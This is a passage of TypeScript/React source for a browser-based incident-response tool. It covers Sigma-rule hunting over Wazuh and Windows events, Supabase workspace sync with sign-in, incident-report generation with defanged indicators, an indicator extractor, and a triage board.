 const startRun=(h:Hit)=>{const p=lib.pbs.find((x:PB)=>x.id===h.playbook);if(!p){setMsg('No playbook named '+h.playbook+' in your library.');return}upLib({runs:[...lib.runs,mkRun(p)].slice(-30)});go('runs')};
 return <div><h1>Hunt</h1><p className="s" role="status" aria-live="polite">{msg||'Paste or load Wazuh alerts or Windows events as JSON. Rules run in your browser. Nothing is uploaded.'}</p>
 <div className="card"><h2>events</h2><p className="s">A JSON array, one JSON object, or one object per line. Wazuh alerts.json lines and exported Windows events both work. Up to 8 MB; large files are held in memory, not shown.</p>
 {big?<div className="w" style={{marginBottom:8}}><b>{big.name}</b>: {big.text.split(/\r?\n/).length.toLocaleString()} lines, {(big.text.length/1048576).toFixed(1)} MB held in memory, not shown so the page stays fast.<div className="row" style={{marginTop:6}}><button className="b" onClick={()=>{setBig(null);setMsg('Cleared.')}}>clear</button></div><pre style={{fontSize:11,maxHeight:80,overflow:'hidden'}}>{big.text.slice(0,400)}</pre></div>:<textarea aria-label="events" rows={8} value={txt} onPaste={onPaste} onChange={e=>setTxt(e.target.value)} placeholder={'{"timestamp":"2026-11-22T02:14:09Z","agent":{"name":"FIN-DC01"},"rule":{"id":"60111","level":12,"description":"..."}}'} style={{width:'100%',fontFamily:'ui-monospace,Menlo,monospace',fontSize:12,padding:'8px 12px',borderRadius:12,border:'2px solid var(--ink)',background:'var(--card)',resize:'vertical'}}/>}
 <div className="row" style={{marginTop:8}}><button className="b pk" disabled={(!big&&!txt.trim())||busy} onClick={run}>{busy?'working...':'run hunt'}</button><button className="b" onClick={()=>{setBig(null);setTxt(SAMPLE_EVENTS.map((x:any)=>JSON.stringify(x)).join('\n'));setMsg('Sample events loaded. Press run hunt.')}}>load sample events</button><label className="b" style={{cursor:'pointer'}}>choose a file<input aria-label="events file" type="file" accept=".json,.jsonl,.log,.txt" onChange={file} style={{display:'none'}}/></label><span className="s">{!big&&txt.trim()?txt.trim().split(/\r?\n/).length+' lines':''}</span></div>
 <details><summary>add your own Sigma rules</summary><p className="s">Paste YAML rules, separated by a line with three dashes. Supported: field modifiers contains, startswith, endswith, re, all; conditions with and, or, not, parentheses, "1 of", "all of". Aggregation: end the condition with <code>| count() by Field &gt;= 5</code> or <code>| count(OtherField) by Field &gt; 3</code> (distinct values). Not supported: lists of maps, timeframes, more than one aggregation. Custom keys <code>playbook</code> link a rule to a playbook name.</p><textarea aria-label="sigma rules" rows={8} value={rules} onChange={e=>setRules(e.target.value)} style={{width:'100%',fontFamily:'ui-monospace,Menlo,monospace',fontSize:12}}/></details></div>
 {prevRaw&&<div className="card"><p className="s">Your previous case was kept when a hit replaced it. <button className="b" onClick={restorePrev}>restore previous case</button></p></div>}
 {res&&res.errors.length>0&&<div className="card">{res.errors.map((x:string,i:number)=><div className="w" key={i}>! {x}</div>)}</div>}
 {res&&<div className="card"><h2>{res.hits.length} hit group{res.hits.length===1?'':'s'} in {nEv} events</h2><p className="s">Built-in rules: {BUILTIN_RULES.length} Sigma, Wazuh alert grouping, and a password-spray check.</p>
 {res.hits.length===0&&<p className="s">No rule matched. That does not mean nothing happened: only these rules were checked.</p>}
 {res.hits.map((h:Hit)=><div className="hot" key={h.id}><div className="row" style={{justifyContent:'space-between'}}><b>{h.title}</b><span className="s">{h.evs.length} event{h.evs.length===1?'':'s'}</span></div>
  <div className="row"><span className="pill">{h.level}</span><span className="pill">{h.kind}</span>{tacticsOf(h.tags).tac.map((t:string)=><span key={t} className="pill g">{t}</span>)}{tacticsOf(h.tags).tech.map((t:string)=><span key={t} className="pill">{t}</span>)}{h.evs.slice(0,3).map((e:any)=>evHost(e)).filter((x:string,i:number,a:string[])=>x&&a.indexOf(x)===i).map((x:string)=><span key={x} className="pill">{x}</span>)}</div>
  <p className="s">{h.desc}</p>
  <div className="row"><button className="b pk" onClick={()=>asCase(h)}>open as case</button>{h.playbook&&lib.pbs.some((p:PB)=>p.id===h.playbook)&&<button className="b te" onClick={()=>startRun(h)}>start run: {h.playbook}</button>}<button className="b" onClick={()=>setOpen(open===h.id?'':h.id)}>{open===h.id?'hide events':'show events'}</button></div>
  {open===h.id&&<pre style={{fontSize:11,maxHeight:260,overflow:'auto'}}>{h.evs.slice(0,3).map((e:any)=>JSON.stringify(e.raw,null,1).slice(0,900)).join('\n---\n')}</pre>}</div>)}</div>}
 <div className="card"><h2>what this is</h2><p className="s">A small detection engine to start from real logs. Selecting <b>open as case</b> preserves up to 120 matching source records in your Timeline (up to 4,000 characters each, with a 150,000-character total raw-data budget; truncation is labeled). It is not a SIEM: no automatic ingestion, correlation across files, or alerting. A match is a lead, not a verdict.</p></div></div>}

const API_BASE:string=(location.protocol==='file:'?'http://localhost:8080':'');
const AUTH_KEY='soc-auth',CLOUD_KEY='soc-cloud';
// Supabase backend. The publishable key is public by design: Row Level Security on your tables is what protects data.
// Never put a secret or service_role key in this file. Override with window.SPECTACLE_SUPABASE={url,key}, or set url to '' to use the Python API instead.
const SBC:any=(window as any).SPECTACLE_SUPABASE||{url:'https://ninknshyiwyccpfrvrwt.supabase.co',key:'sb_publishable_X8Mp3xlaNYNi-XIrRWf5LA_PqeHhoBN'};
const SB_ON:boolean=!!(SBC.url&&SBC.key);
async function sb(path:string,o:any={}):Promise<any>{
 let r:Response;
 try{r=await fetch(SBC.url+path,{method:o.method||'GET',headers:{apikey:SBC.key,'Content-Type':'application/json',Authorization:'Bearer '+(o.token||SBC.key),...(o.prefer?{Prefer:o.prefer}:{})},body:o.body===undefined?undefined:JSON.stringify(o.body)})}
 catch(e){const x:any=new Error('Cannot reach Supabase. Your work is still saved in this browser.');x.status=0;throw x}
 let j:any=null;try{j=await r.json()}catch(e){}
 if(!r.ok){const x:any=new Error((j&&(j.msg||j.message||j.error_description||j.error))||('Request failed ('+r.status+')'));x.status=r.status;x.data=j;throw x}
 return j}
const sbSess=(r:any,org?:string)=>({token:r.access_token,refresh:r.refresh_token,exp:Date.now()+(r.expires_in||3600)*1000,user:r.user,org:org||''});
async function sbWorkspace(t:string):Promise<string>{const r=await sb('/rest/v1/workspace_members?select=workspace_id&limit=1',{token:t});if(!r||!r.length){const x:any=new Error('No workspace found for this account.');x.status=404;throw x}return r[0].workspace_id}
function sbToState(pd:any,name:string,kind?:string):any{const d:any={...(pd||{})};if(d.kind!==(kind||'soc-case'))return {};if(name&&!d.name)d.name=name;return d}
async function sbPut(auth:any,l:any,s:any,force?:number,o?:any):Promise<any>{const nm=(o&&o.kind==='soc-library')?LIBNAME:(s.name||'SOC case');
 const t=await auth.fresh();const doc=JSON.parse(JSON.stringify(s));
 if(!l){const ws=await sbWorkspace(t);const c=await sb('/rest/v1/projects',{method:'POST',token:t,prefer:'return=representation',body:{workspace_id:ws,name:nm,project_data:doc,created_by:auth.a.user.id}});return{id:c[0].id,version:c[0].version}}
 const v=force!=null?force:l.version;
 const r=await sb('/rest/v1/projects?id=eq.'+l.id+'&version=eq.'+v,{method:'PATCH',token:t,prefer:'return=representation',body:{project_data:doc,name:nm,version:v+1}});
 if(r&&r.length)return{id:r[0].id,version:r[0].version};
 const cur=await sb('/rest/v1/projects?select=version&id=eq.'+l.id,{token:t});
 const x:any=new Error('conflict');
 if(cur&&cur.length){x.status=409;x.data={current_version:cur[0].version}}else{x.status=404;x.message='This project no longer exists in your workspace.'}
 throw x}
const lsGet=(k:string):any=>{try{return JSON.parse(localStorage.getItem(k)||'null')}catch(e){return null}};
const lsSet=(k:string,v:any)=>{try{if(v==null)localStorage.removeItem(k);else localStorage.setItem(k,JSON.stringify(v))}catch(e){}};
async function api(method:string,path:string,body?:any,token?:string):Promise<any>{
 let r:Response;
 try{r=await fetch(API_BASE+path,{method,headers:{'Content-Type':'application/json',...(token?{Authorization:'Bearer '+token}:{})},body:body===undefined?undefined:JSON.stringify(body)})}
 catch(e){const x:any=new Error('Cannot reach the server. Your work is still saved in this browser.');x.status=0;throw x}
 let j:any={};try{j=await r.json()}catch(e){}
 if(!r.ok){const x:any=new Error(j.error||('Request failed ('+r.status+')'));x.status=r.status;x.data=j;throw x}
 return j}
const track=(name:string)=>{if(SB_ON)return;const a=lsGet(AUTH_KEY);if(a&&a.token)api('POST','/v1/events',{name},a.token).catch(()=>{})};
function useAuth():any{
 const [a,setA]=useState<any>(()=>lsGet(AUTH_KEY));const [busy,setBusy]=useState(false);const [err,setErr]=useState('');
 const aR=useRef<any>(a);const set=(v:any)=>{aR.current=v;lsSet(AUTH_KEY,v);setA(v)};
 const fresh=async():Promise<string>=>{const c=aR.current;if(!c||!c.token){const x:any=new Error('Not signed in');x.status=401;throw x}
  if(!SB_ON||!c.refresh||c.exp-Date.now()>60000)return c.token;
  try{const r=await sb('/auth/v1/token?grant_type=refresh_token',{method:'POST',body:{refresh_token:c.refresh}});const n=sbSess(r,c.org);n.user=r.user||c.user;set(n);return n.token}
  catch(e:any){if(e.status!==0)e.status=401;throw e}};
 const enterSb=async(mode:string,email:string,password:string,name:string)=>{setBusy(true);setErr('');
  try{const r=mode==='in'?await sb('/auth/v1/token?grant_type=password',{method:'POST',body:{email,password}}):await sb('/auth/v1/signup',{method:'POST',body:{email,password,data:{name}}});
   if(!r.access_token)setErr('Check your email to confirm your account, then sign in.');else set(sbSess(r))}
  catch(e:any){setErr(e.message)}setBusy(false)};
 useEffect(()=>{if(!a||!a.token)return;let dead=false;
  if(SB_ON){fresh().catch((e:any)=>{if(!dead&&e.status===401){set(null);setErr('Your session expired. Sign in again.')}});return()=>{dead=true}}
  api('GET','/v1/me',undefined,a.token).then((m:any)=>{if(dead)return;const o=m.orgs&&m.orgs[0];set({...a,user:m.user,org:o?o.id:a.org})}).catch((e:any)=>{if(!dead&&e.status===401){set(null);setErr('Your session expired. Sign in again.')}});
  return()=>{dead=true}},[]);
 const enter=async(path:string,body:any)=>{setBusy(true);setErr('');try{const r=await api('POST',path,body);const m=await api('GET','/v1/me',undefined,r.token);const o=m.orgs&&m.orgs[0];set({token:r.token,user:m.user,org:o?o.id:''})}catch(e:any){setErr(e.message)}setBusy(false)};
 return{a,busy,err,setErr,fresh,
  signIn:(email:string,password:string)=>SB_ON?enterSb('in',email,password,''):enter('/v1/auth/login',{email,password}),
  signUp:(email:string,password:string,name:string)=>SB_ON?enterSb('up',email,password,name):enter('/v1/auth/signup',{email,password,name}),
  signOut:()=>{lsSet(CLOUD_KEY,null);lsSet('soc-libcloud',null);set(null);setErr('')},
  expire:()=>{lsSet(CLOUD_KEY,null);lsSet('soc-libcloud',null);set(null);setErr('Your session expired. Sign in again.')}}}
function useCloud(s:any,up:(p:any)=>void,auth:any,o?:any):any{o=o||{key:CLOUD_KEY,kind:'soc-case',name:'SOC case'};
 const [link,setLink]=useState<any>(()=>lsGet(o.key));
 const [status,setStatus]=useState('');const [conflict,setConflict]=useState<number|null>(null);const [busy,setBusy]=useState(false);
 const last=useRef<string>(link?JSON.stringify(s):'');const linkR=useRef<any>(link);const busyR=useRef(false);
 const tok=auth.a&&auth.a.token;
 const setL=(v:any)=>{linkR.current=v;lsSet(o.key,v);setLink(v)};
 const fail=(e:any)=>{if(e.status===401)auth.expire();else setStatus(e.message)};
 const save=async(forceVersion?:number)=>{
  if(!tok||busyR.current)return;busyR.current=true;setBusy(true);
  try{
   let l=linkR.current;const doc=JSON.stringify(s);let nl:any;
   if(SB_ON){nl=await sbPut(auth,l,s,forceVersion,o)}
   else{if(!l){const c=await api('POST','/v1/projects',{kind:o.kind,name:o.kind==='soc-library'?LIBNAME:(s.name||'SOC case'),org_id:auth.a.org||undefined},tok);l={id:c.id,version:c.version};setL(l)}
    const r=await api('PUT','/v1/projects/'+l.id,{doc:JSON.parse(doc),version:forceVersion!=null?forceVersion:l.version},tok);nl={id:l.id,version:r.version}}
   setL(nl);last.current=doc;setConflict(null);setStatus('Saved to your workspace')
  }catch(e:any){if(e.status===409){setConflict(e.data.current_version);setStatus(''+(o.kind==='soc-library'?'The playbook library':'This case')+' changed somewhere else.')}else{if(e.status===404&&SB_ON)setL(null);fail(e)}}
  busyR.current=false;setBusy(false)};
 const load=async()=>{
  if(!tok)return;busyR.current=true;setBusy(true);
  try{
   let l=linkR.current;let p:any;
   if(SB_ON){const t=await auth.fresh();const q=l?'&id=eq.'+l.id:'&workspace_id=eq.'+(await sbWorkspace(t))+'&project_data-%3E%3Ekind=eq.'+o.kind+'&order=created_at.desc&limit=1';
    const ls=await sb('/rest/v1/projects?select=id,name,version,project_data'+q,{token:t});if(!ls.length){setStatus('Nothing saved yet. Save first.');return}
    p={id:ls[0].id,version:ls[0].version,doc:sbToState(ls[0].project_data,ls[0].name,o.kind)}}
   else{if(!l){const ls=await api('GET','/v1/projects?kind='+o.kind,undefined,tok);const mine=ls.projects;if(!mine.length){setStatus('Nothing saved yet. Save first.');return}l={id:mine[0].id,version:0}}
    p=await api('GET','/v1/projects/'+l.id,undefined,tok)}
   if(p.doc&&Object.keys(p.doc).length){up(p.doc);last.current=JSON.stringify({...s,...p.doc})}
   setL({id:p.id,version:p.version});setConflict(null);setStatus('Loaded the latest from your workspace')
  }catch(e:any){fail(e)}finally{busyR.current=false;setBusy(false)}};
 const saveR=useRef(save);saveR.current=save;
 useEffect(()=>{if(!tok){setL(null);setStatus('')}},[tok]);
 useEffect(()=>{if(!tok||!link||conflict!=null)return;if(JSON.stringify(s)===last.current)return;const t=setTimeout(()=>saveR.current(),1500);return()=>clearTimeout(t)},[s,tok,link&&link.id,conflict]);
 return{link,status,busy,conflict,save:()=>save(),load,overwrite:()=>{if(conflict!=null)save(conflict)}}}
function Account({auth}:any){
 const [email,setEmail]=useState('');const [pw,setPw]=useState('');const [name,setName]=useState('');const [mode,setMode]=useState('in');
 const a=auth.a;
 if(a&&a.token)return <div className="card"><h2>account</h2><p className="s">signed in as {a.user?a.user.email:'...'}. your work saves to your own workspace.</p><div className="row"><button className="b" onClick={auth.signOut}>sign out</button></div></div>;
 const go=()=>{if(mode==='in')auth.signIn(email,pw);else auth.signUp(email,pw,name)};
 return <div className="card"><h2>account</h2><p className="s">{'optional. sign in to save your cases to your workspace'+(SB_ON?'':' and share snapshots with your team')+'. without it, everything stays in this browser.'}</p>
 <div className="row">{[['in','sign in'],['up','create account']].map((m:string[])=><span key={m[0]} className={'chip '+(mode===m[0]?'on':'')} onClick={()=>{setMode(m[0]);auth.setErr('')}}>{m[1]}</span>)}</div>
 {mode==='up'&&<><label>name</label><input value={name} autoComplete="name" onChange={e=>setName(e.target.value)}/></>}
 <label>email</label><input type="email" autoComplete="email" value={email} onChange={e=>setEmail(e.target.value)}/>
 <label>password{mode==='up'?' ('+(SB_ON?'6':'10')+' characters or more)':''}</label><input type="password" autoComplete={mode==='in'?'current-password':'new-password'} value={pw} onChange={e=>setPw(e.target.value)} onKeyDown={e=>{if(e.key==='Enter')go()}}/>
 <div className="row" style={{marginTop:12}}><button className="b pk" disabled={auth.busy||!email||!pw} onClick={go}>{auth.busy?'one moment...':mode==='in'?'sign in':'create account'}</button><span className="s" role="status" aria-live="polite">{auth.err}</span></div></div>}
function Cloud({auth,cloud,title,what}:any){
 if(!(auth.a&&auth.a.token))return null;
 const c=cloud;
 return <div className="card"><div className="row" style={{justifyContent:'space-between'}}><h2>{title||'workspace sync'}</h2>{c.link&&<span className="pill g">{c.conflict!=null?'paused':'auto-save on'}</span>}</div>
 <p className="s">{c.link?'this '+(what||'case')+' is linked to your workspace and saves a moment after you stop typing.':'save once to link this '+(what||'case')+' to your workspace. after that it saves itself.'}</p>
 <div className="row"><button className="b pk" disabled={c.busy} onClick={c.save}>{c.link?'save now':'save to workspace'}</button><button className="b" disabled={c.busy} onClick={c.load}>load latest</button><span className="s" role="status" aria-live="polite">{c.status}</span></div>
 {c.conflict!=null&&<div className="w">! someone saved a newer version. load it, or keep yours and overwrite.<div className="row" style={{marginTop:8}}><button className="b" onClick={c.load}>load theirs</button><button className="b" onClick={c.overwrite}>keep mine</button></div></div>}</div>}

// ---- scoring, checks, report ----
const scored=(s:St)=>s.findings.filter((p:Finding)=>p.t.trim()).map((p:Finding)=>({...p,sc:+(p.s*Math.max(1,p.a.length)*W[p.c]).toFixed(1)})).sort((a:any,b:any)=>b.sc-a.sc);
function checks(s:St){const ev=s.evidence.filter((x:Evid)=>x.t.trim());const txt=s.problem+' '+s.why;return [
{n:'Facts before conclusions',id:'sec-facts',ok:!!s.problem.trim()&&(!CONC.test(s.problem)||ev.length>=2)},
{n:'Evidence has a source',id:'sec-evidence',ok:ev.some((x:Evid)=>x.k==='IOC'&&!/scratchpad|unverified/i.test(x.g))&&ev.every((x:Evid)=>x.g.trim()!=='')},
{n:'Timeline stated',id:'sec-facts',ok:(s.whynow.match(TIME)||[]).length>=2},
{n:'Mapped to ATT&CK',id:'sec-findings',ok:s.findings.some((f:Finding)=>!!f.t.trim()&&!!f.th)},
{n:'Contained or consciously accepted',id:'sec-actions',ok:s.actions.some((r:Act)=>r.b==='contain'&&!!r.t.trim())&&s.actions.some((r:Act)=>r.b==='accept'&&!!r.t.trim())},
{n:'No premature attribution',id:'sec-facts',ok:!ATTR.test(txt)||ev.length>=3}]}
const dfg=(v:string)=>v.replace(/https?/gi,(m:string)=>m.toLowerCase()==='https'?'hxxps':'hxxp').replace(/\./g,'[.]').replace(/@/g,'[@]');
const AB:any={contain:'Contain now',eradicate:'Eradicate and recover',monitor:'Monitor',accept:'Accept risk or out of scope'};
function md(s:St){const d=s.detail||2;const L=scored(s);const ev=s.evidence.filter((x:Evid)=>x.t.trim());const A=(b:string)=>s.actions.filter((r:Act)=>r.b===b&&r.t.trim());
 let o='# Incident report: '+(s.name||'Untitled')+'\n\nSource: '+(s.cat||'TBD')+'\nDecision needed: '+(s.goal||'TBD')+'\n\n## Summary\n'+(s.problem||'TBD')+'\nImpact if real: '+(s.why||'TBD')+'\n\n## Timeline\n'+(s.whynow||'TBD')+'\n';
 if(d>1)o+='\n## Affected assets\n'+(s.assets.length?s.assets.map((a:string)=>'- '+a).join('\n'):'- TBD')+'\n';
 if((s.timeline||[]).length)o+='\n## Recorded event chronology ('+s.timeline.length+' entries)\n'+traceText(s.timeline)+'\n';
 o+='\n## Findings, ranked by risk\n'+(L.length?L.map((x:any,i:number)=>(i+1)+'. '+x.t+': severity '+x.s+'/5, '+x.th+', '+x.a.length+' asset'+(x.a.length===1?'':'s')+', '+CL[x.c].toLowerCase()+', risk '+x.sc).join('\n'):'- None recorded')+'\n';
 if(d>1)o+='\n## Evidence (indicators defanged)\n'+(ev.length?ev.map((x:Evid)=>'- '+x.k+': '+(x.k==='IOC'?dfg(x.t):x.t)+(x.g?' (source: '+x.g+')':' (source TBD)')).join('\n'):'- TBD')+'\n';
 o+='\n## Response\n'+Object.keys(AB).map((b:string)=>AB[b]+':\n'+(A(b).map((r:Act)=>'- '+r.t).join('\n')||'- None')).join('\n')+'\n';
 if(d>1){const R=s.runs.filter((r:Run)=>r.pbName);o+='\n## Playbook runs\n'+(R.length?R.map((r:Run)=>'- '+r.pbName+' v'+r.v+': '+(r.verdict||(r.done?'finished, no verdict':'in progress'))+', '+r.steps.filter((x:RStep)=>x.st==='done').length+'/'+r.steps.length+' steps done').join('\n'):'- None')+'\n'}
 if(d===3)o+='\n## Detection gaps and lessons\n'+(L.filter((x:any)=>x.c!=='contained').map((x:any)=>'- '+x.th+': '+x.t).join('\n')||'- None flagged')+'\n';
 return o+'\n## Open questions\n'+(checks(s).filter((c:any)=>!c.ok).map((c:any)=>'- Resolve: '+c.n).join('\n')||'- None flagged')+'\n'}

// ---- indicator extractor (pattern based, check every result) ----
const TLDS=new Set('com net org io ru cn info biz xyz top site online co uk de fr nl in br jp kr tk ml ga cf gq cc ws pw club shop app dev cloud me us ca au it es pl ua ir su tv vip live work link click page tech store edu gov mil int eu ch se no fi dk be at cz ro bg hu gr pt ie il tr sa ae za ng ke eg mx ar cl pe ve id my sg th vn ph hk tw nz lt lv ee by kz ge am az uz ly to sh gg im is ai so cx st bz vc fm la mn nu pm re tf wf yt win bid loan men review stream download racing science party trade date faq icu rest fun space website host press mobi name pro asia cyou buzz monster cam beauty zip mov'.split(' '));
const FILEEXT=new Set('zip mov sh py js ps1 exe dll bat cmd txt log md id is to so'.split(' '));
const refang=(t:string)=>t.replace(/hxxp/gi,'http').replace(/\[\.\]|\(\.\)|\{\.\}|\[dot\]|\(dot\)/gi,'.').replace(/\[@\]|\(at\)/gi,'@').replace(/\[:\]/g,':');
function privIp(ip:string){const p=ip.split('.').map(Number);return p[0]===10||p[0]===127||(p[0]===172&&p[1]>=16&&p[1]<=31)||(p[0]===192&&p[1]===168)||(p[0]===169&&p[1]===254)}
function extractIocs(raw:string):{k:string;t:string;note:string}[]{
 const dec=decodeB64s(raw);let t=refang(raw+(dec.length?'\n'+dec.map((d:any)=>d.text).join('\n'):''));const out:{k:string;t:string;note:string}[]=[];const seen:any={};
 const add=(k:string,v:string,note?:string)=>{const key=k+'|'+v.toLowerCase();if(seen[key])return;seen[key]=1;out.push({k,t:v,note:note||''})};
 const take=(re:RegExp,k:string,fn?:(v:string)=>string)=>{t=t.replace(re,(m:string)=>{add(k,m,fn?fn(m):'');return ' '})};
 take(/\bhttps?:\/\/[^\s<>"'`)\]]+/gi,'URL');
 take(/\bCVE-\d{4}-\d{4,7}\b/gi,'CVE');
 take(/\b[a-f0-9]{64}\b/gi,'SHA256');take(/\b[a-f0-9]{40}\b/gi,'SHA1');take(/\b[a-f0-9]{32}\b/gi,'MD5');
 take(/\b(?:[0-9a-f]{1,4}:){7}[0-9a-f]{1,4}\b/gi,'IPv6');
 take(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g,'Email');
 take(/\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g,'IP',(v:string)=>privIp(v)?'internal':'external');
 (t.match(/\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}\b/gi)||[]).forEach((d:string)=>{const tld=(d.split('.').pop()||'').toLowerCase();if(TLDS.has(tld)&&!(FILEEXT.has(tld)&&d.split('.').length===2&&/^(?:[a-z0-9_-]{1,12})$/i.test(d.split('.')[0])&&['zip','mov','sh','py','js','ps1','exe','dll','bat','cmd','txt','log','md'].indexOf(tld)>=0))add('Domain',d.toLowerCase())});
 return out}

// ---- triage matrix vocabulary ----
const QL=['contain now','plan the fix','tidy up','accept risk'];
const BUCKET=['contain','eradicate','monitor','accept'];
const quad=(n:Note)=>(n.x<50?(n.y<50?0:2):(n.y<50?1:3));
const EX:any[]=[
 {t:'Remove svc-backup from Domain Admins',x:12,y:14,votes:4,cm:['Identity lead: one click, do it now']},
 {t:'Reset svc-backup credentials',x:26,y:30,votes:3,cm:['Needs a window for the backup job']},
 {t:'Block 203.0.113.50 at the VPN',x:20,y:20,votes:2,cm:['External source, no business reason']},
 {t:'Rebuild FIN-WS22',x:72,y:22,votes:1,cm:['Only if forensics finds a dropper']},
 {t:'Add alert for service accounts logging on interactively',x:64,y:34,votes:3,cm:['Closes the detection gap']},
 {t:'Review old group changes by the same actor',x:30,y:64,votes:2,cm:[]},
 {t:'Audit every service account in the domain',x:84,y:78,votes:1,cm:['Valuable, but a project of its own']},
 {t:'Rename svc-backup',x:70,y:70,votes:0,cm:['Cosmetic']}];
const TOUR:any[]=[
 {k:'title',t:'1 · name the question',b:'Pick one decision. Narrow enough to answer in this shift, broad enough that people disagree.'},
 {k:'board',t:'2 · plot impact and effort',b:'Drag each sticky. Higher means more impact if left alone. Further right means more effort to respond. Arrow keys nudge a selected sticky, and Shift makes bigger steps.'},
 {k:'detail',t:'3 · weigh the options',b:'Select a sticky to add comments and confidence votes. Move stickies as the discussion sharpens them.'},
 {k:'plan',t:'4 · turn it into actions',b:'Start in contain now, the top left. Send a sticky, or the whole board, to the case as response actions.'}];

function Char(){const ref=useRef<HTMLDivElement>(null);const api=useRef<any>({spin:0,wave:0,jump:0,zoom:10});const [err,setErr]=useState(false);
useEffect(()=>{const el=ref.current!;const T=(window as any).THREE;if(!T){setErr(true);return}
let off=()=>{};try{const h=300,w0=el.clientWidth||320;const sc=new T.Scene();const cam=new T.PerspectiveCamera(35,w0/h,.1,50);cam.position.set(0,1.8,10);cam.lookAt(0,1.5,0);
const r=new T.WebGLRenderer({antialias:true,alpha:true});r.setPixelRatio(Math.min(2,window.devicePixelRatio||1));r.setSize(w0,h);el.appendChild(r.domElement);
sc.add(new T.HemisphereLight(0xffffff,0x8888aa,.95));const dl=new T.DirectionalLight(0xffffff,.8);dl.position.set(3,5,5);sc.add(dl);
const M=(c:number)=>new T.MeshStandardMaterial({color:c,roughness:.55});const S=(q:number)=>new T.SphereGeometry(q,32,24);const g=new T.Group();sc.add(g);
const mk=(geo:any,c:number,x:number,y:number,z:number,sx=1,sy=1,sz=1,p:any=g)=>{const m=new T.Mesh(geo,M(c));m.position.set(x,y,z);m.scale.set(sx,sy,sz);p.add(m);return m};
mk(S(1),0xe5e7eb,0,1,0,1,1.1,.9);mk(new T.CylinderGeometry(.92,1,.7,32),0x3f3f46,0,.4,0,1,1,1);mk(S(.85),0xf1d4bd,0,2.45,0);
mk(new T.SphereGeometry(.92,32,16,0,Math.PI*2,0,Math.PI/2),0x18181b,0,2.62,0);mk(S(.6),0x18181b,0,2.62,.72,1,.12,.8);mk(S(.16),0xe8b896,0,2.2,.88);
const eyes:any[]=[];[-.3,.3].forEach(x=>{eyes.push(mk(S(.15),0xffffff,x,2.4,.78,1,1,.5));eyes.push(mk(S(.075),0x18181b,x,2.4,.83,1,1,.5))});
const arm=(x:number)=>{const p=new T.Group();p.position.set(x,1.75,0);g.add(p);mk(S(.28),0xe5e7eb,0,-.55,0,1,2.1,1,p);mk(S(.25),0xf1d4bd,0,-1.15,0,1,1,1,p);return p};
const aL=arm(-1.1),aR=arm(1.1);aL.rotation.z=-.25;[-.5,.5].forEach(x=>mk(S(.4),0x18181b,x,-.05,.3,1,.6,1.4));
const cb=mk(new T.BoxGeometry(.8,1,.1),0xffffff,-1.55,.75,.5);cb.rotation.z=.15;mk(new T.BoxGeometry(.5,.08,.12),0x71717a,-1.55,1.25,.5);
const sh=new T.Mesh(new T.CircleGeometry(1.5,32),new T.MeshBasicMaterial({color:0x000000,transparent:true,opacity:.12}));sh.rotation.x=-Math.PI/2;sh.position.y=-.35;sc.add(sh);
const look={x:0,y:0};let vel=0,drag=false,lx=0,touched=false,raf=0;const rm=window.matchMedia('(prefers-reduced-motion:reduce)').matches;
const tick=(t:number)=>{const s=t/1000,a=api.current;if(!rm)g.position.y=Math.sin(s*2.2)*.08;if(a.jump>0){g.position.y+=Math.sin((1-a.jump)*Math.PI)*1.1;a.jump=Math.max(0,a.jump-.035)}g.rotation.x+=((rm?0:look.y*.35)-g.rotation.x)*.08;cam.position.z+=(a.zoom-cam.position.z)*.12;aR.rotation.z=a.wave>t?2.4+Math.sin(s*14)*.35:.12+(rm?0:Math.sin(s*2)*.04);
const b=(s%3.4)>3.28;eyes.forEach(e=>{e.scale.y=b?.1:1});
if(!drag){if(a.spin>0){g.rotation.y+=.11;a.spin-=.11}else{g.rotation.y+=vel;vel*=.94;if(!rm&&!touched)g.rotation.y+=.006}}
r.render(sc,cam);raf=requestAnimationFrame(tick)};raf=requestAnimationFrame(tick);
const dn=(e:any)=>{drag=true;lx=e.clientX;touched=true};const mv=(e:any)=>{const bb=el.getBoundingClientRect();look.x=(e.clientX-bb.left)/bb.width-.5;look.y=(e.clientY-bb.top)/bb.height-.5;if(!drag)return;const d=(e.clientX-lx)*.012;lx=e.clientX;g.rotation.y+=d;vel=d};const up=()=>{drag=false};
el.style.touchAction='pan-y';el.style.cursor='grab';el.addEventListener('pointerdown',dn);window.addEventListener('pointermove',mv);window.addEventListener('pointerup',up);
const ro=new ResizeObserver(()=>{const w=el.clientWidth;if(w){r.setSize(w,h);cam.aspect=w/h;cam.updateProjectionMatrix()}});ro.observe(el);
off=()=>{cancelAnimationFrame(raf);ro.disconnect();el.removeEventListener('pointerdown',dn);window.removeEventListener('pointermove',mv);window.removeEventListener('pointerup',up);r.dispose();if(r.domElement.parentNode)r.domElement.parentNode.removeChild(r.domElement)}}catch(e){setErr(true)}
return()=>off()},[]);
return <div><div ref={ref} style={{height:300,width:'100%'}}>{err&&<p className="s" style={{padding:20}}>3D is not available on this device.</p>}</div><div className="row" style={{justifyContent:'center'}}><button className="b" onClick={()=>{api.current.spin=Math.PI*2}}>Spin 360°</button><button className="b" onClick={()=>{api.current.wave=performance.now()+2200}}>Wave</button><button className="b" onClick={()=>{api.current.jump=1}}>Jump</button><input type="range" min="6" max="14" step=".5" defaultValue="10" aria-label="Camera distance" style={{maxWidth:130}} onChange={e=>{api.current.zoom=+e.target.value}}/></div><p className="s" style={{textAlign:'center',margin:'8px 0 0'}}>Meet Spec. Drag to rotate.</p></div>}

function Hold({label,onDone}:any){const [p,setP]=useState(false);const t=useRef<any>(null);const go=()=>{setP(true);t.current=setTimeout(()=>{setP(false);onDone()},1200)};const stop=()=>{clearTimeout(t.current);setP(false)};return <button className="b hold" title="Hold to confirm" style={{touchAction:'manipulation',userSelect:'none',WebkitTouchCallout:'none'}} onPointerDown={go} onPointerUp={stop} onPointerLeave={stop} onPointerCancel={stop}><span className="fill" style={{clipPath:p?'inset(0 0 0 0)':'inset(0 100% 0 0)',transition:p?'clip-path 1.2s linear':'clip-path .2s cubic-bezier(.23,1,.32,1)'}}/><span style={{position:'relative'}}>Hold: {label}</span></button>}

function Board({notes,sel,onSel,onCommit,grid,snap,dragRef,tgt}:any){
 const ref=useRef<HTMLDivElement>(null);
 const [live,setLive]=useState<any>(null);
